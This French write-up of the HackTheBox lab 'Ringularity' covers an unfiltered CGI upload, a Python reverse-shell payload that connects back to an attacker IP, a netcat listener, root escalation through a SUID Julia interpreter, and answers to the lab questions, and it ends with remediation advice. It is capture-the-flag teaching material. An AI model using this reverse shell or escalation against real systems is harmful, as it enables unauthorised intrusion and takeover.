# Ringularity — HackTheBox Write-Up

**OS:** Linux
**Difficulté:** Très facile
**IP cible:** 10.129.7.74

---

## Résumé

Machine Linux exposant une application web Apache d'upload de fichiers basée sur **Python CGI**. L'upload n'est pas filtré : on uploade un script CGI malveillant exécuté côté serveur, ce qui donne un **RCE** et un shell en tant qu'utilisateur `julia`. L'interpréteur du langage **Julia** porte le bit **SUID root**, exploité via GTFOBins pour passer root.

**Chaîne :** Upload arbitraire (CGI Python) → RCE → shell `julia` → SUID julia → root.

---

## 1. Reconnaissance

```bash
nmap -sCV -p- 10.129.7.74
```

- **Port 80** : Apache, application web d'upload de fichiers.
- CGI Python actif (`upload.py`).

---

## 2. Foothold — Upload CGI → RCE

L'application accepte les fichiers et exécute les scripts `.py` via le handler CGI.

Payload `shell.py` (fork + setsid pour survivre à la fin du process CGI parent) :

```python
#!/usr/bin/env python3
print("Content-Type: text/html\n")
import os, socket, subprocess
LHOST = "TON_IP_TUN0"
LPORT = 4444
pid = os.fork()
if pid == 0:
    os.setsid()
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((LHOST, LPORT))
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)
    subprocess.call(["/bin/sh", "-i"])
    os._exit(0)
```

Listener :

```bash
nc -lvnp 4444
```

Upload via le formulaire (`upload.py`), puis déclenchement en appelant le script dans le répertoire CGI. Shell reçu en tant que **julia**.

---

## 3. User Flag

```bash
cat /home/julia/user.txt
```

---

## 4. Privilege Escalation — SUID Julia

```bash
find / -perm -4000 -type f 2>/dev/null
```

→ binaire **julia** avec bit SUID root.

```bash
julia -e 'run(`/bin/sh -p`)'
```

Le flag `-p` conserve l'EUID root (sinon le shell drop les privilèges). Shell **root**.

---

## 5. Root Flag

```bash
cat /root/root.txt
```

---

## Réponses aux questions

| # | Question | Réponse |
|---|----------|---------|
| Q1 | Serveur web port 80 | Apache |
| Q2 | Langage CGI | Python |
| Q3 | Utilisateur d'exécution CGI | julia |
| Q4 | Permission "s'exécute en tant que propriétaire" | SUID (SetUID) |
| Q5 | Interpréteur SUID root | julia |

---

## Remédiation

- Désactiver `ExecCGI` sur le dossier d'upload, stocker les fichiers hors webroot.
- Whitelist stricte des extensions/MIME, renommage, pas d'exécution.
- Retirer le SUID de l'interpréteur : `chmod u-s $(which julia)`.